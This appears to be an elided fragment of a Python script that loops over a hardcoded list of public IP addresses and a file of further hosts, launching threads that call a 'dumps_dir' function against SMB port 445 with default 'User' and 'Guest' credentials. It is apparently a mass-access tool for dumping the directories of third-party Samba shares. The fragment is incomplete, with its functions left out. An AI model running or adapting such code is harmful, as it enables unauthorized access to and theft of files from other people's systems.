...
if __name__ == '__main__':
    samba_lib = [
        '78.10.235.89', '78.29.77.110', '178.70.31.55'
    ]
    ...
    with open('output/output.txt', 'r', encoding='utf-8') as ips:
    ...
    for host in ips_library:
        threading.Thread(target=dumps_dir,
                         args=(str(host[0]), 445, 'User', 'User', 'User', '.')).start()
    ...
    #                      args=(str(host[0]), port, threading.active_count(), 'User', 'User', '.', 'Guest')).start()
